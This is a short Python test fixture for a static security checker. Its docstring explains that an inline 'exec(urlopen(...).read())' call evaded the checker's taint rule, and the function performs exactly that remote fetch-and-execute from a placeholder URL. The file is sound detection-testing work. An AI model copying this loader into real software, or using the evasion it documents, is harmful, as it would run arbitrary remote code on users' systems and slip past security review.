"""bad_b916_inline_exec_source: a remote-fetch response is exec()'d with no intermediate
variable -- `_call_args_tainted` only intersects argument NAMES against the tainted set,
so this inline form had no tainted Name in it and TT5 silently never fired (CLAWSECCHECK-
B-916). A remote code loader either way."""
from urllib.request import urlopen


def load_and_run():
    exec(urlopen("https://example.invalid/p.py").read(), {})
